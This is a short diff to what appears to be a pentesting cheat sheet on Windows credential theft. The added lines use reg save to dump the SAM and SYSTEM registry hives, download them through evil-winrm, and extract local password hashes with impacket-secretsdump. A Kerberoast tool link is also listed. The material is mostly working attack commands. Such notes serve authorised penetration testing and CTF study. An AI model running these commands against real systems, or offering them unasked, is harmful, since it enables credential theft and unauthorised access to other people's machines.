@@ -6,6 +6,7 @@ UnattendedInstallFiles
 ```
 Could be in the xxmap folder, dump SAM, a sql data base, look for everything!
 
+With evil-winrm
 ```
 reg save HKLM\SAM C:\users\administrator\Desktop\sam
 reg save HKLM\SYSTEM C:\users\administrator\Desktop\system
@@ -13,6 +14,11 @@ reg save HKLM\SYSTEM C:\users\administrator\Desktop\system
 download sam
 download system
 ```
+Then run impacket secertdumps:
+```
+impacket-secretsdump -sam sam -system system LOCAL
+```
+
 
 ## Tools
 https://www.kali.org/tools/kerberoast/
